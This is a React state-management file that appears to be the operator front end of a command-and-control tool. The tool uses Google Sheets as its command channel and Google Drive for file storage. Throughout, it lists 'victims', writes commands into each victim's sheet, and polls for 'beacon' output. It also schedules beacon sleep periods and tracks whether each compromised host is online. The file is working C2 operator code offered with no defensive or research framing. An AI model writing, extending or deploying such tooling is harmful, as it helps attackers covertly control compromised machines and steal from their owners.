import { createContext, useContext, useState, useEffect, useCallback, useRef } from 'react';
import axios from 'axios';

const AppContext = createContext(null);

// How often to poll while waiting for beacon response (ms)
const POLL_INTERVAL_MS = 4000;
// Stop polling after this many attempts (e.g. 75 × 4s = 5 min)
const MAX_POLL_ATTEMPTS = 75;

export function AppProvider({ children }) {
  const [config, setConfig] = useState({
    sheetId: '', driveId: '', hasServiceAccount: false,
    commandService: '', fileSystemService: '',
  });
  const [configLoaded, setConfigLoaded] = useState(false);
  const [configError, setConfigError]   = useState(null);

  const [victims, setVictims]           = useState([]);
  const [activeVictim, setActiveVictim] = useState(null);
  const [rows, setRows]                 = useState([]);
  const [driveFiles, setDriveFiles]     = useState([]);
  const [loading, setLoading]           = useState(false);
  const [driveLoading, setDriveLoading] = useState(false);
  const [error, setError]               = useState(null);
  const [ticker, setTicker]             = useState(60);
  const [autoRefresh, setAutoRefresh]   = useState(false);
  const [lastRefresh, setLastRefresh]   = useState(null);
  const [showSettings, setShowSettings] = useState(false);
  const [showDrive, setShowDrive]       = useState(false);
  const [sleepStatus, setSleepStatus]   = useState({});
  const [victimStatus, setVictimStatus] = useState({});
  // ── Smart polling state ───────────────────────────────────────────────────
  // pendingRow: the rowIndex we're waiting for a beacon response on
  const [pendingRow, setPendingRow]     = useState(null);
  const [polling, setPolling]           = useState(false);
  const pollTimerRef  = useRef(null);
  const pollCountRef  = useRef(0);
  const activeVictimRef = useRef(activeVictim);
  useEffect(() => { activeVictimRef.current = activeVictim; }, [activeVictim]);

  // ── Load config from options.yml ──────────────────────────────────────────
  const fetchConfig = useCallback(async () => {
    try {
      const res = await axios.get('/api/config');
      setConfig(res.data);
      setConfigError(null);
      setConfigLoaded(true);
    } catch (e) {
      setConfigError(e.response?.data?.error || e.message);
      setConfigLoaded(true);
    }
  }, []);

  useEffect(() => { fetchConfig(); }, []);

  const isConfigured = configLoaded && config.hasServiceAccount && !!config.sheetId;

  const saveConfig = useCallback(async (updates) => {
    try {
      await axios.post('/api/config', updates);
      await fetchConfig();
    } catch (e) {
      setError(e.response?.data?.error || e.message);
    }
  }, [fetchConfig]);

  // ── Core fetch rows (returns the rows array so polling can inspect it) ────
  const setVictimOnline = useCallback((victimId, online) => {
    setVictimStatus((prev) => ({
      ...prev,
      [victimId]: online ? 'online' : 'offline',
    }));
  }, []);

  const fetchRowsRaw = useCallback(async (victim) => {
    if (!victim || !isConfigured) return null;
    try {
      const res = await axios.get('/api/sheets/rows', {
        params: { sheetName: victim.title },
      });
      const fetched = res.data.rows || [];
      setRows(fetched);
      setLastRefresh(new Date());
      setVictimOnline(victim.id, true);
      if (sleepStatus[victim.id]) {
        const sleepEntry = sleepStatus[victim.id];
        if (new Date(sleepEntry.wakeAt) <= new Date() && sleepEntry.state !== 'ready') {
          setSleepStatus((prev) => ({
            ...prev,
            [victim.id]: {
              ...prev[victim.id],
              state: 'ready',
            },
          }));
        }
      }
      return fetched;
    } catch (e) {
      setError(e.response?.data?.error || e.message);
      if (victim?.id && sleepStatus[victim.id] && new Date(sleepStatus[victim.id].wakeAt) <= new Date()) {
        setSleepStatus((prev) => ({
          ...prev,
          [victim.id]: {
            ...prev[victim.id],
            state: 'waiting',
          },
        }));
      }
      setVictimOnline(victim?.id, false);
      return null;
    }
  }, [isConfigured, sleepStatus, setVictimOnline]);

  const fetchRowsForVictim = useCallback(async (victim) => {
    if (!victim || !isConfigured) return null;
    try {
      const res = await axios.get('/api/sheets/rows', {
        params: { sheetName: victim.title },
      });
      return res.data.rows || [];
    } catch (_) {
      return null;
    }
  }, [isConfigured]);

  const fetchRows = useCallback(async (victim = activeVictimRef.current) => {
    if (!victim || !isConfigured) return;
    setLoading(true);
    try {
      await fetchRowsRaw(victim);
      // Also refresh ticker silently
      try {
        const tr = await axios.get('/api/sheets/ticker', {
          params: { sheetName: victim.title },
        });
        setTicker(tr.data.ticker || 60);
      } catch (_) {}
    } finally {
      setLoading(false);
    }
  }, [isConfigured, fetchRowsRaw]);

  // ── Stop any in-progress poll ─────────────────────────────────────────────
  const stopPolling = useCallback(() => {
    if (pollTimerRef.current) {
      clearInterval(pollTimerRef.current);
      pollTimerRef.current = null;
    }
    pollCountRef.current = 0;
    setPolling(false);
    setPendingRow(null);
  }, []);

  // ── Start smart polling after a command is sent ───────────────────────────
  // Polls every POLL_INTERVAL_MS and stops as soon as the target row has output.
  const startPolling = useCallback((targetRowIndex) => {
    // Clear any previous poll
    if (pollTimerRef.current) clearInterval(pollTimerRef.current);
    pollCountRef.current = 0;
    setPendingRow(targetRowIndex);
    setPolling(true);

    pollTimerRef.current = setInterval(async () => {
      pollCountRef.current += 1;

      const victim = activeVictimRef.current;
      if (!victim) { stopPolling(); return; }

      const fetched = await fetchRowsRaw(victim);

      if (fetched) {
        // Find the row we're waiting on (rowIndex is 1-based)
        const targetRow = fetched.find(r => r.rowIndex === targetRowIndex);
        if (targetRow && targetRow.output) {
          // Got the response — stop polling
          stopPolling();
          return;
        }
      }

      // Safety: stop after MAX_POLL_ATTEMPTS
      if (pollCountRef.current >= MAX_POLL_ATTEMPTS) {
        stopPolling();
      }
    }, POLL_INTERVAL_MS);
  }, [fetchRowsRaw, stopPolling]);

  const parseSleepDuration = (value) => {
    if (!value) return null;
    const trimmed = value.trim();
    const regexp = /(?:(\d+)h)?(?:(\d+)m)?(?:(\d+)s)?$/i;
    const matched = trimmed.match(regexp);
    if (!matched) return null;
    const hours = Number(matched[1] || 0);
    const minutes = Number(matched[2] || 0);
    const seconds = Number(matched[3] || 0);
    const total = hours * 3600000 + minutes * 60000 + seconds * 1000;
    return total > 0 ? total : null;
  };

  const parseHHMMSS = (value) => {
    if (!value) return null;
    const parts = value.trim().split(':');
    if (parts.length !== 3) return null;
    const h = Number(parts[0]);
    const m = Number(parts[1]);
    const s = Number(parts[2]);
    if (isNaN(h) || isNaN(m) || isNaN(s)) return null;
    if (m >= 60 || s >= 60) return null;
    const ms = h * 3600000 + m * 60000 + s * 1000;
    return ms > 0 ? ms : null;
  };

  // ── Send a command ────────────────────────────────────────────────────────
  const sendCommand = useCallback(async (command) => {
    if (!activeVictimRef.current || !isConfigured) return false;
    try {
      // Stop any existing poll for a previous command
      stopPolling();

      const cmdRows = rows.filter(r => r.command && r.command !== 'Delay configuration (sec)');
      const nextRowIndex = cmdRows.length + 1;
      const trimmed = command.trim();
      const sleepCommand = trimmed.toLowerCase().startsWith('sleep ');
      const finishCommand = trimmed.toLowerCase() === 'finish';
      let sleepMs = null;
      const activeSleep = sleepStatus?.[activeVictimRef.current.id] && new Date(sleepStatus[activeVictimRef.current.id].wakeAt) > new Date();

      if (finishCommand) {
        setError('Use direct sleep command only, e.g. sleep 00:02:00.');
        return false;
      }

      if (sleepCommand) {
        const durationString = trimmed.substring(6).trim();
        sleepMs = parseHHMMSS(durationString) || parseSleepDuration(durationString);
        if (sleepMs === null) {
          setError('Invalid sleep format. Use HH:MM:SS (e.g., 00:02:00) or examples like 10s, 5m, 1h30m.');
          return false;
        }
      }

      await axios.post('/api/sheets/command', {
        sheetName: activeVictimRef.current.title,
        command,
        rowIndex: nextRowIndex,
      });

      // Immediately refresh once so the sent command shows up
      await fetchRowsRaw(activeVictimRef.current);

      if (sleepCommand && sleepMs !== null) {
        const wakeAt = new Date(Date.now() + sleepMs);
        setSleepStatus((prev) => ({
          ...prev,
          [activeVictimRef.current.id]: {
            wakeAt,
            duration: trimmed.substring(6).trim(),
            command: trimmed,
            state: 'sleeping',
          },
        }));
        setVictimOnline(activeVictimRef.current.id, true);
      } else if (!activeSleep) {
        startPolling(nextRowIndex);
      }

      return true;
    } catch (e) {
      setError(e.response?.data?.error || e.message);
      return false;
    }
  }, [isConfigured, rows, fetchRowsRaw, startPolling, stopPolling, sleepStatus, parseHHMMSS]);

  // ── Victims ───────────────────────────────────────────────────────────────
  const fetchVictims = useCallback(async () => {
    if (!isConfigured) return;
    try {
      setLoading(true); setError(null);
      const res = await axios.get('/api/sheets/tabs');
      const tabs = res.data.tabs || [];
      setVictims(tabs);
      if (!activeVictimRef.current && tabs.length > 0) {
        setActiveVictim(tabs[tabs.length - 1]);
      }
    } catch (e) {
      setError(e.response?.data?.error || e.message);
    } finally {
      setLoading(false);
    }
  }, [isConfigured]);

  // ── Drive ─────────────────────────────────────────────────────────────────
  const fetchDriveFiles = useCallback(async () => {
    if (!isConfigured || !config.driveId) return;
    try {
      setDriveLoading(true);
      const res = await axios.get('/api/drive/files');
      setDriveFiles(res.data.files || []);
    } catch (e) {
      setError(e.response?.data?.error || e.message);
    } finally {
      setDriveLoading(false);
    }
  }, [isConfigured, config.driveId]);

  const updateTicker = useCallback(async (value) => {
    if (!activeVictimRef.current || !isConfigured) return;
    try {
      await axios.post('/api/sheets/ticker', {
        sheetName: activeVictimRef.current.title,
        ticker: value,
      });
      setTicker(value);
    } catch (e) {
      setError(e.response?.data?.error || e.message);
    }
  }, [isConfigured]);

  // ── Effects ───────────────────────────────────────────────────────────────
  useEffect(() => { if (isConfigured) fetchVictims(); }, [isConfigured]);

  useEffect(() => {
    if (activeVictim) {
      stopPolling(); // stop polling when switching victims
      fetchRows(activeVictim);
    }
  }, [activeVictim?.id]);

  useEffect(() => {
    const interval = setInterval(async () => {
      if (!isConfigured) return;
      const now = new Date();
      const entries = Object.entries(sleepStatus);
      if (entries.length === 0) return;

      for (const [victimId, entry] of entries) {
        if (!entry || entry.state === 'ready') continue;
        const wakeAt = new Date(entry.wakeAt);
        if (wakeAt > now) continue;

        const victim = victims.find((v) => v.id === victimId);
        if (!victim) continue;

        const rowsForVictim = await fetchRowsForVictim(victim);
        if (rowsForVictim) {
          setSleepStatus((prev) => ({
            ...prev,
            [victimId]: {
              ...prev[victimId],
              state: 'ready',
            },
          }));
          setVictimOnline(victimId, true);
        } else {
          setSleepStatus((prev) => ({
            ...prev,
            [victimId]: {
              ...prev[victimId],
              state: 'waiting',
            },
          }));
          setVictimOnline(victimId, false);
        }
      }
    }, 10000);
    return () => clearInterval(interval);
  }, [isConfigured, sleepStatus, victims, fetchRowsForVictim, setVictimOnline]);

  // Auto-refresh (manual toggle)
  useEffect(() => {
    if (!autoRefresh || !activeVictim) return;
    const id = setInterval(() => fetchRows(), ticker * 1000);
    return () => clearInterval(id);
  }, [autoRefresh, ticker, activeVictim]);

  // Drive files
  useEffect(() => {
    if (showDrive && config.driveId) fetchDriveFiles();
  }, [showDrive]);

  // Cleanup poll on unmount
  useEffect(() => () => stopPolling(), []);

  return (
    <AppContext.Provider value={{
      config, saveConfig, fetchConfig,
      configLoaded, configError,
      victims, activeVictim, setActiveVictim,
      rows, fetchRows,
      driveFiles, fetchDriveFiles,
      loading, driveLoading,
      error, setError,
      ticker, updateTicker,
      autoRefresh, setAutoRefresh,
      lastRefresh,
      sendCommand,
      fetchVictims,
      isConfigured,
      showSettings, setShowSettings,
      showDrive, setShowDrive,
      sleepStatus,
      victimStatus,
      parseHHMMSS,
      // Polling state for UI indicator
      polling, pendingRow,
    }}>
      {children}
    </AppContext.Provider>
  );
}

export const useApp = () => useContext(AppContext);
